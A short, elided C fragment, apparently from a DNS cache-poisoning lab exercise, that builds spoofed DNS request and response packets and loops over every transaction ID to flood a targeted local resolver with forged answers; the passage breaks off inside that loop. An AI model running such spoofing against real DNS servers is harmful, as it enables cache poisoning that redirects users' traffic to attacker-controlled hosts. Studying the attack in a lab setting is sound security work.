...
int main()
{
  ...
  while (1) {
    ...
    int offset_queryname = 41;
    memcpy(ip_req+offset_queryname, name, 5);


    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    
    int offset_ansname = 64;
    memcpy(ip_resp+offset_queryname, name, 5);
    memcpy(ip_resp+offset_ansname, name, 5);

    send_raw_packet(ip_req, n_req);
    for(uint16_t i = 0; i < 0xffff; i++){
      *(uint16_t*)(ip_resp + 28) = i;
